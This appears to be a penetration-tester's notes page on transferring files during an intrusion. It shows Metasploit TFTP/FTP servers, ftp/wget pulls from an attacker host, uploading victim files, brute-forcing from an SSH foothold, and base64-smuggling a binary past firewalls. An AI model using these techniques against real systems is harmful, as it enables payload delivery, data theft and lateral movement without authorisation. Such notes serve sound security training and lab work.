---
layout: default
title: Other Transfer
permalink: /other_transfer/
---

## TFTP

TFTP (Trivial File Transfer Protocol)	TFTP uses UDP for simple file transfers, commonly used by older Windows systems and others.

Use metaspoit framework:
```
use auxiliary/server/tftp
set srvhost 192.168.31.141
set tftproot /root/raj
run
```

```
tftp -i 192.168.31.219 GET ignite.txt
dir
```

## FTP

Use metasploit framework:
```
msfconsole -q
use auxiliary/server/ftp
set srvhost 192.168.31.141
set ftproot /root/raj
set ftpuser raj
set ftppass 123
run
```

```
ftp 192.168.31.141
dir
get ignite.txt
```
```
ftp ftp://$ftpuser:$password@localhost
```

```
python3 -m pyftpdlib -w -p 21 -u ignite -P 123
```

```
ftp 192.168.31.141
get ignite.txt
put C:\Users\raj\avni.txt
```

or:
`wget ftp://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>)`

# Expanding Attack Surface
After you gained access to e.g. SSH credentials (`ssh $user@$ip -p $port`), run `netstat` and `nmap` (`nmap localhost`) within the SSH session to list open ports. Then we can do some exploration to find potential usernames and run e.g. medusa within the SSH session. 

# Using Base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it.

```
base64 binary_file -w 0
```
Then:
```
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > file
```
# Validating
```
md5sum file
```

